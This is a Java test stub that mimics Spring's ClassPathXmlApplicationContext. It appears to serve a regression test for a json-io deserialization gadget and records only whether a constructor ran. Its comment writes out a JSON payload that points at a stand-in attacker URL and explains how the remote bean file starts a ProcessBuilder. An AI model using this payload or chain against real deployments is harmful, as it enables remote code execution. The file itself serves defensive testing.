package org.springframework.context.support;

import org.springframework.context.ApplicationContext;

/**
 * Stand-in for Spring's {@code ClassPathXmlApplicationContext}, shaped like the real one in the two
 * ways that made it exploitable through json-io's default deserialization configuration:
 * <ol>
 *     <li>a <b>varargs</b> {@code String... configLocations} constructor — java-util's
 *         named-parameter matching widens a single JSON string into a {@code String[1]}, so the
 *         payload {@code {"configLocations":"http://attacker/evil.xml"}} matches every parameter; and</li>
 *     <li>a constructor <b>side effect</b> — the real one calls {@code refresh()}, which fetches the
 *         attacker's URL and instantiates the beans declared there (e.g. {@code ProcessBuilder} with
 *         {@code init-method="start"}) inside a Spring child context, beyond the reach of java-util's
 *         security gate. {@link #refreshed} stands in for that.</li>
 * </ol>
 */
public class ClassPathXmlApplicationContext implements ApplicationContext {
    /** Set iff a constructor ran — i.e. iff the security gate was bypassed. */
    public static volatile String refreshed;

    public ClassPathXmlApplicationContext(String... configLocations) {
        refreshed = configLocations != null && configLocations.length > 0 ? configLocations[0] : "<empty>";
    }

    public ClassPathXmlApplicationContext() {
        refreshed = "<no-arg>";
    }
}
